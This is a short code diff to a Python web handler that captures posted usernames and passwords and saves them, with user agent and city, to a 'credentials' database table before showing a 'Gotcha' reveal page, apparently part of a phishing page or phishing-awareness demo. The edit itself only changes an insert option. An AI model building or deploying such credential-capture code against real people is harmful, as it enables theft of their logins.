@@ -43,7 +43,7 @@ async def capture(request: Request, u: str = Form(...), p: str = Form(...)):
     
     # Save to Supabase
     data = {"username": u, "password": p, "user_agent": user_info,"city": city}
-    supabase.table("credentials").insert(data).execute()
+    supabase.table("credentials").insert(data, returning="minimal").execute()
 
     # The Reveal Page (The "Gotcha")
     return HTMLResponse(content=f"""
